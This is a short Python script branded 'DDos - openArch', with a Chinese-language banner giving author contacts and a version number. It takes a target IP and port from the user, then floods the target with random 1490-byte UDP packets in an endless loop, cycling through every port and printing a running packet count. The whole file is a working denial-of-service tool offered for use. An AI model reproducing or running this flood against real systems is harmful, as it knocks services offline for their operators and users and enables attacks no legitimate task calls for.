import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos - openArch")
print('')
print  ('')
print  ("<=====================================================================> ")
print  ("   作者          : openArch                                          ")
print  ("   作者CSDN博客  : https://blog.csdn.net/2301_82206160?type=blog     ")
print  ("   作者github    : https://github.com/open-Arch                      ")
print  ('   版本          ：V2.02-Bate                                         ')
print  ("   QQ群          : 686822329                                         ")
print  ("<=====================================================================>")
print  ('')
print ("        <<--------------[禁止滥用或二次贩卖盈利]----------------->>      ")
print('')
ip = input("     -> 输入目标IP        : ")
port = int(input("     -> 输入正确端口      : "))
sd = int(input("     -> 攻击速度(1~10000) : "))


os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     if port == 65534:
       port = 1

